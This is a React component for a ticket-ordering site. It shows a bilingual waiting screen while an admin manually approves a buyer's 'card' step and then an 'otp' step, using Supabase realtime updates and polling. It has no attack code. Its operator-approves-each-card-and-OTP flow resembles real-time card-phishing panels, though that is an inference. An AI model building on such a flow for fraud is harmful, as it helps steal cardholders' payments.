import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useLanguage } from "@/i18n/LanguageContext";
import { Loader2, CheckCircle, XCircle, Clock } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { playChime } from "@/hooks/use-action-sound";

interface WaitingApprovalProps {
  orderId: string;
  onApproved: () => void;
  onRejected: () => void;
  step: "card" | "otp";
}

const WaitingApproval = ({ orderId, onApproved, onRejected, step }: WaitingApprovalProps) => {
  const { lang } = useLanguage();
  const isAr = lang === "ar";
  const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");
  const [elapsed, setElapsed] = useState(0);

  // Timer
  useEffect(() => {
    const interval = setInterval(() => setElapsed((e) => e + 1), 1000);
    return () => clearInterval(interval);
  }, []);

  // Listen for realtime changes
  useEffect(() => {
    const expectedStatus = step === "card" ? "approved_card" : "confirmed";

    const channel = supabase
      .channel(`order-approval-${orderId}`)
      .on(
        "postgres_changes" as any,
        {
          event: "UPDATE",
          schema: "public",
          table: "ticket_orders",
          filter: `id=eq.${orderId}`,
        },
        (payload: any) => {
          const newStatus = payload.new?.status;
          if (newStatus === expectedStatus) {
            setStatus("approved");
            playChime("success");
            setTimeout(onApproved, 1500);
          } else if (newStatus === "rejected") {
            setStatus("rejected");
            playChime("error");
            setTimeout(onRejected, 2000);
          }
        }
      )
      .subscribe();

    // Also poll every 3 seconds as fallback
    const pollInterval = setInterval(async () => {
      const { data } = await supabase
        .from("ticket_orders")
        .select("status")
        .eq("id", orderId)
        .single();
      if (data?.status === expectedStatus) {
        setStatus("approved");
        playChime("success");
        setTimeout(onApproved, 1500);
      } else if (data?.status === "rejected") {
        setStatus("rejected");
        playChime("error");
        setTimeout(onRejected, 2000);
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(pollInterval);
    };
  }, [orderId, step, onApproved, onRejected]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
  };

  return (
    <div className="flex flex-col items-center justify-center py-12 px-4 text-center">
      <AnimatePresence mode="wait">
        {status === "waiting" && (
          <motion.div
            key="waiting"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            className="flex flex-col items-center gap-4"
          >
            <div className="relative">
              <div className="w-20 h-20 rounded-full bg-amber-100 dark:bg-amber-900/30 flex items-center justify-center">
                <Clock className="w-10 h-10 text-amber-600 dark:text-amber-400" />
              </div>
              <motion.div
                className="absolute inset-0 rounded-full border-2 border-amber-400"
                animate={{ scale: [1, 1.3, 1], opacity: [0.5, 0, 0.5] }}
                transition={{ duration: 2, repeat: Infinity }}
              />
            </div>
            <h2 className="text-xl font-bold text-foreground">
              {isAr ? "بانتظار الموافقة" : "Waiting for Approval"}
            </h2>
            <p className="text-sm text-muted-foreground max-w-xs">
              {isAr
                ? "طلبك قيد المراجعة من قبل الإدارة. يرجى الانتظار..."
                : "Your request is being reviewed by admin. Please wait..."}
            </p>
            <div className="flex items-center gap-2 text-amber-600 dark:text-amber-400">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span className="font-mono text-sm font-semibold">{formatTime(elapsed)}</span>
            </div>
          </motion.div>
        )}

        {status === "approved" && (
          <motion.div
            key="approved"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="flex flex-col items-center gap-4"
          >
            <div className="w-20 h-20 rounded-full bg-emerald-100 dark:bg-emerald-900/30 flex items-center justify-center">
              <CheckCircle className="w-10 h-10 text-emerald-600 dark:text-emerald-400" />
            </div>
            <h2 className="text-xl font-bold text-emerald-600 dark:text-emerald-400">
              {isAr ? "تمت الموافقة ✅" : "Approved ✅"}
            </h2>
            <p className="text-sm text-muted-foreground">
              {isAr ? "جارٍ الانتقال..." : "Redirecting..."}
            </p>
          </motion.div>
        )}

        {status === "rejected" && (
          <motion.div
            key="rejected"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="flex flex-col items-center gap-4"
          >
            <div className="w-20 h-20 rounded-full bg-red-100 dark:bg-red-900/30 flex items-center justify-center">
              <XCircle className="w-10 h-10 text-red-600 dark:text-red-400" />
            </div>
            <h2 className="text-xl font-bold text-red-600 dark:text-red-400">
              {isAr ? "تم الرفض ❌" : "Rejected ❌"}
            </h2>
            <p className="text-sm text-muted-foreground">
              {isAr ? "تم رفض طلبك. جارٍ العودة..." : "Your request was rejected. Going back..."}
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default WaitingApproval;
